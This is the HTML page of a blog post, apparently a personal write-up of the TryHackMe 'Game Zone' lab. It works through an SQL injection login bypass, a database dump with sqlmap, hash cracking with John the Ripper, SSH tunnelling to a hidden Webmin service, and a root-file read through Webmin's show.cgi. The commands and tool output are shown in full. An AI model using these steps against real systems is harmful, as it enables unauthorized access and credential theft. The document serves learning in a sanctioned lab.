@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/gamezone_writeup/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="GameZone_writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/gamezone_writeup/" /><meta property="article:published_time" content="2020-08-24T16:19:31-04:00" />
+
+
+
+<meta name="twitter:title" content="GameZone_writeup.sh"/>
+<meta name="twitter:description" content="This is a quick writeup or another &lsquo;just-me-taking-notes&rsquo; thing for the GameZone&rsquo;s TryhackMe room."/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/gamezone_writeup'>gamezone_writeup</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>GameZone_writeup.sh</h1>
+Aug. 24, 2020
+
+
+<br/><br/>
+<img src="../img/gameZone_cover.gif" alt="Post Cover Gif animation";>
+<br/><br/>
+<h1 id="game-zone-room">Game Zone Room</h1>
+<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for the GameZone&rsquo;s TryhackMe room. This room is quite guided so there won&rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task.
+Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/gamezone">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<h2 id="task-1-deploy-the-vulnerable-machine">[Task 1] Deploy the vulnerable machine</h2>
+<blockquote>
+<p>Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?</p>
+</blockquote>
+<p>For this we could do an image search but, since I know this from my old gamer times. It was quite easy to answer. If you don&rsquo;t know the answer, google is your friend.</p>
+<h2 id="task-2-obtain-access-via-sqli">[Task 2] Obtain access via SQLi</h2>
+<p>So we need to exploit SQLi (injection) to get access to the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">AND</span> password :<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; or 1=1 -- -
+</span></code></pre></div><blockquote>
+<p>Question#3 When you&rsquo;ve logged in, what page do you get redirected to?</p>
+</blockquote>
+<p>Às per the room we know there is no Admin username. In this case we can still use the following string as username leaving the password empty.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#e6db74">&#39; or 1=1 -- -
+</span></code></pre></div><p>After a using that string as username (leaving the password empty), we get logged in and arrive to a <strong>portal.php</strong> page. We can answer the question now.</p>
+<h2 id="task-3-using-sqlmap">[Task 3] Using SQLMap</h2>
+<p>SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed <a href="https://github.com/sqlmapproject/sqlmap">here</a>.</p>
+<p>There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.</p>
+<p>First we need to use the portal page we are logged into, Using Burp suite intercept a simple search request made on that page. Save the request into a text file.We can then pass this into SQLMap to use our authenticated user session.</p>
+<p>We just need to call SQLMap with this request following this format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
+</code></pre></div><ul>
+<li>-r uses the intercepted request you saved earlier</li>
+<li>&ndash;dbms tells SQLMap what type of database management system it is</li>
+<li>&ndash;dump attempts to outputs the entire database</li>
+</ul>
+<p>We&rsquo;ll get something like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
+        ___
+       __H__
+ ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.4.8#stable}
+</span><span style="color:#e6db74">|_ -| . [,]     | .&#39;| . |
+</span><span style="color:#e6db74">|___|_  [&#34;</span><span style="color:#f92672">]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> legal disclaimer: Usage of sqlmap <span style="color:#66d9ef">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span style="color:#e6db74">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[*] starting @ 15:09:43 /2020-08-24/
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[15:09:43] [INFO] parsing HTTP request from &#39;</span>search_req.txt<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:09:43] [INFO] testing connection to the target URL
+</span><span style="color:#e6db74">[15:09:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+</span><span style="color:#e6db74">[15:09:44] [INFO] testing if the target URL content is stable
+</span><span style="color:#e6db74">[15:09:45] [INFO] target URL content is stable
+</span><span style="color:#e6db74">[15:09:45] [INFO] testing if POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; is dynamic
+</span><span style="color:#e6db74">[15:09:45] [WARNING] POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; does not appear to be dynamic
+</span><span style="color:#e6db74">[15:09:45] [INFO] heuristic (basic) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be injectable (possible DBMS: &#39;</span>MySQL<span style="color:#e6db74">&#39;)
+</span><span style="color:#e6db74">[15:09:46] [INFO] heuristic (XSS) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be vulnerable to cross-site scripting (XSS) attacks
+</span><span style="color:#e6db74">[15:09:46] [INFO] testing for SQL injection on POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">for the remaining tests, do you want to include all tests for &#39;</span>MySQL<span style="color:#e6db74">&#39; extending provided level (1) and risk (1) values? [Y/n] y
+</span><span style="color:#e6db74">[15:09:59] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:09:59] [WARNING] reflective value(s) found and filtering out
+</span><span style="color:#e6db74">[15:10:04] [INFO] testing &#39;</span>Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>original value<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>Generic inline queries<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:29] [INFO] testing &#39;</span>OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+
+</code></pre></div><p>This will take some time as SQLMap will try different ways of exploiting the DB, eventually it should dump the database.</p>
+<blockquote>
+<p>Question #2 In the users table, what is the hashed password?</p>
+</blockquote>
+<p>From the data displayed by the tool we get that answer, also the next one as well.</p>
+<blockquote>
+<p>Question #3 What was the username associated with the hashed password?</p>
+</blockquote>
+<p>Let&rsquo;s move to the next Task.</p>
+<h2 id="task-4-cracking-a-password-with-johntheripper">[Task 4] Cracking a password with JohnTheRipper</h2>
+<p>John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.</p>
+<p>We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there.</p>
+<p>This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.</p>
+<p>For this we need the hash string we found with SQLMap, save that into a txt file.</p>
+<p>To run John we use the following command and we&rsquo;ll use <strong>rockyou.txt</strong> as our wordlist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256
+
+</code></pre></div><p>Let&rsquo;s break down that those options mean:</p>
+<ul>
+<li>hash.txt - contains a list of your hashes (in your case its just 1 hash)</li>
+<li>&ndash;wordlist - is the wordlist you&rsquo;re using to find the dehashed value</li>
+<li>&ndash;format - is the hashing algorithm used. In our case its hashed using SHA256.</li>
+</ul>
+<p>Let&rsquo;s run John:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sudo john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-SHA256 <span style="color:#f92672">[</span>SHA256 128/128 AVX 4x<span style="color:#f92672">])</span>
+Warning: poor OpenMP scalability <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+Will run <span style="color:#ae81ff">8</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+REDACTEDPASSWORD    <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-08-24 15:31<span style="color:#f92672">)</span> 2.941g/s 8673Kp/s 8673Kc/s 8426KC/s vimivi..vainlove
+Use the <span style="color:#e6db74">&#34;--show --format=Raw-SHA256&#34;</span> options to display all of the cracked passwords reliably
+Session completed
+
+</code></pre></div><blockquote>
+<p>Question #2 What is the de-hashed password?</p>
+</blockquote>
+<p>We answered that with the ouput from John.</p>
+<blockquote>
+<p>Question #3 Now you have a password and username. Try SSH&rsquo;ing onto the machine.What is the user flag?</p>
+</blockquote>
+<p>With the password we can now SSH into the computer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh agent47@10.10.89.82
+The authenticity of host <span style="color:#e6db74">&#39;10.10.89.82 (10.10.89.82)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.89.82<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">agent47@10.10.89.82&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">109</span> packages can be updated.
+<span style="color:#ae81ff">68</span> updates are security updates.
+
+
+Last login: Fri Aug <span style="color:#ae81ff">16</span> 17:52:04 <span style="color:#ae81ff">2019</span> from 192.168.1.147
+agent47@gamezone:~$ ls -al
+total <span style="color:#ae81ff">28</span>
+drwxr-xr-x <span style="color:#ae81ff">3</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root    root       <span style="color:#ae81ff">9</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47 <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .cache
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">655</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .profile
+-rw-rw-r-- <span style="color:#ae81ff">1</span> agent47 agent47   <span style="color:#ae81ff">33</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> user.txt
+agent47@gamezone:~$ cat user.txt
+<span style="color:#f92672">{</span>redacted_user_flag<span style="color:#f92672">}</span>
+
+</code></pre></div><p>And there&rsquo;s our answer.</p>
+<h2 id="task-5-exposing-services-with-reverse-ssh-tunnels">[Task 5] Exposing services with reverse SSH tunnels</h2>
+<p>Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.</p>
+<p>-L is a local tunnel (YOU &lt;&ndash; CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 <a href="mailto:user@example.com">user@example.com</a>. Going to localhost:9000 on your machine, will load imgur traffic using your other server.</p>
+<p>-R is a remote tunnel (YOU &ndash;&gt; CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.</p>
+<p>e will use a tool called ss to investigate sockets running on a host.</p>
+<p>If we run <strong>ss -tulpn</strong> it will tell us what socket connections are running</p>
+<p>Argument	Description
+-t	Display TCP sockets
+-u	Display UDP sockets
+-l	Displays only listening sockets
+-p	Shows the process using the socket
+-n	Doesn&rsquo;t resolve service names</p>
+<blockquote>
+<p>Questions #1 How many TCP sockets are running?</p>
+</blockquote>
+<p>Let&rsquo;s run <strong>ss</strong> and see what it shows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q           Local Address:Port                          Peer Address:Port              
+udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:68                                       *:*                  
+udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:10000                                    *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">80</span>                   127.0.0.1:3306                                     *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:10000                                    *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:22                                       *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::80                                      :::*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::22                                      :::*     
+</code></pre></div><p>We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!</p>
+<p>From our local machine, run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 10000:localhost:10000 &lt;username&gt;@&lt;ip&gt;
+</code></pre></div><p>Let&rsquo;s run that SSH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh -L 10000:localhost:10000 agent47@10.10.89.82
+agent47@10.10.89.82<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">109</span> packages can be updated.
+<span style="color:#ae81ff">68</span> updates are security updates.
+
+
+Last login: Mon Aug <span style="color:#ae81ff">24</span> 14:34:33 <span style="color:#ae81ff">2020</span> from 10.13.0.34
+
+</code></pre></div><blockquote>
+<p>Question #2 What is the name of the exposed CMS?</p>
+</blockquote>
+<p>Once complete, in your browser type <strong>localhost:10000</strong> and you can access the newly-exposed webserver.
+When we do that, we see a <strong>Webmin</strong> login form.</p>
+<blockquote>
+<p>Question #3 What is the CMS version?</p>
+</blockquote>
+<p>At this point we do have a username and password, so let&rsquo;s login to see the Webmin logged user page. With that we should have the information we need for Question number 3.</p>
+<h2 id="task-6-privilege-escalation-with-metasploit">[Task 6] Privilege Escalation with Metasploit</h2>
+<p>Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.</p>
+<p>Before we jump to <strong>Metasploit</strong> let&rsquo;s run <strong>searchsploit webmin 1.580</strong> to see if we can get a bit more of details on the available exploits:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ searchsploit webmin 1.580
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+Webmin 1.580 - <span style="color:#e6db74">&#39;/file/show.cgi&#39;</span> Remote Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>               | unix/remote/21851.rb
+Webmin &lt; 1.920 - <span style="color:#e6db74">&#39;rpc.cgi&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                       | linux/webapps/47330.rb
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+</code></pre></div><p>We now know there is Remote Command Execution vulnerability availble and also a Remote Code Execution as well. Let&rsquo;s run <strong>msfconsole</strong> and see how we can exploit this CMS with Metasploit.</p>
+<p>After failing for a while, I took a look on google to see if we can find the module itself to see what it does. Turns out its rather easy, it just uses the <strong>show.cgi</strong> component to read out any file passes into it. With this we can just run this on our local machine browser and get the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://localhost:10000/file/show.cgi/root/root.txt
+
+</code></pre></div><p>Once we run that command the browser will read out the contents of root.txt and give us the answer to the last Question:</p>
+<blockquote>
+<p>Question #1 What is the root flag?</p>
+</blockquote>
+<p>a4b94{redacted_root_flag_XD}</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
